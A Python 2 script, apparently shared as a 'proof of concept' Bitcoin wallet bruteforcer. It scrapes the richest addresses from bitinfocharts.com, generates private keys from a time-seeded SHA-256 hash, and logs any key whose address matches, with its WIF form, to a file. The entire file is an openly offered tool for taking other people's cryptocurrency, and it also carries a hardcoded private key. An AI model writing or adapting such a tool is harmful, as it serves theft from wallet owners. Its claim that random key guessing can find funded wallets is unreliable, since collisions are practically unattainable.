__author__ = 'LordEvron'
'''/////////////////////////////////////////////////////////////////////////////
//  name     main.py
//
//  brief    Proof of concept of BTC wallet bruteforcer
//
//  author   LordEvron
//
//  date      19.02.2019
//
//  Note: tested with python 2.7 : install requests, ecdsa, BeautifulSoup
//
//h-////////////////////////////////////////////////////////////////////////// '''
import requests
from bs4 import BeautifulSoup
import lib_key , time, hashlib
import kyutil
addresses = []

LUCKYWORLD= "luck01" #define the seed of the random private key generator
MAXPAGE= 70             #number of pages to fetch the address from.

def extract(html):
    global addresses
    b=requests.get(html)
    soup = BeautifulSoup(b.text, 'html.parser')
    for link in soup.find_all('a'):
        #print len(link.contents[0])
        if len(link.contents[0]) <30 or len(link.contents[0]) >45:
            continue
        addresses.append(link.contents[0])
        #print(link.get('href'))


def generate():
    print ("$$$$$$$$$$$$-------Fetching the top rich BTC addresses online-----$$$$$$$$$$$$$")
    for i in range(2,MAXPAGE, 1):
        extract("https://bitinfocharts.com/top-100-richest-bitcoin-addresses-" + str(i)+".html")

    with open("richWalletDump.txt", "wb") as f:
        for item in addresses:
            f.write("%s\n" % item)

    print ("Loaded "+ str(len(addresses)) + " addresses  $$$ lets begin....")


def run_main():
    generate()
    #we test with a known pair or private pub key
    privkey = "E9873D79C6D87DC0FB6A5778633389F4453213303DA61F20BD67FC233AA33262"
    assert kyutil.keyToAddr(privkey)=="1CC3X2gu58d6wXUWMffpuzN9JAfTUWu4Kj"
    m = hashlib.sha256()
    m.update(str(time.time()))
    i=0
    t=time.time()
    while 1:
        i=i+1
        m.update(LUCKYWORLD+str(time.time()))
        privkey=m.hexdigest()
        wall=kyutil.keyToAddr(privkey)
        #print privkey
        #print wall
        if i==1000:
            print ("1.000 keys checked in " + str(time.time() - t) + " seconds")
            t=time.time()
            i=0
            #wall ="1JYgjo2xnqnEp3ChWGv3rdWDWsJXYcESDD"
        if wall in addresses:
            with open("keyfond.txt", "a") as fi:
                print ("--------------COLLISION FOUND!!!!!------------")
                print(str(privkey))
                print(str(wall))
                print (str(lib_key.numtowif(long(privkey,16))))
                fi.write("--------------COLLISION FOUND!!!!!------------\n")
                fi.write(str(privkey)+ "\n")
                fi.write(str(wall)+ "\n")
                fi.write(str(lib_key.numtowif(long(privkey,16)))+ "\n")
                print ("--------------END COLLISION!!!!!------------")

run_main()
